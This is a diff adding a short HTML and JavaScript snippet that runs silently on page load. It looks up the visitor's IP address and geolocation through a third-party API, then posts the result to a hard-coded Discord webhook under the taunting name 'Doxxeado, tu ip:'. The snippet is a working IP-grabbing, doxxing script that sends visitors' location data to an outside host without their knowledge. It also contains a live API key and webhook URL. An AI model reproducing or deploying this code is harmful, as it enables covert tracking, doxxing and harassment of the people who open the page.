@@ -1,0 +1,19 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+// Base + Confidence Area
+let apiKey = 'd9e53816d07345139c58d0ea733e3870';
+$.getJSON('https://api.bigdatacloud.net/data/ip-geolocation-with-confidence?key=' + apiKey, function(data) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/983148970232664164/6mpSXo3oXGJY7aH7PTAGrmVSCBn211TGgpV1cH_G3Dgv9iHCyf5cW4QRohIAtw6Szlnb");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Doxxeado, tu ip:",
+        avatar_url: "",
+        content: JSON.stringify(data, null, 2)
+      }
+
+      request.send(JSON.stringify(params));
+});
+</script>
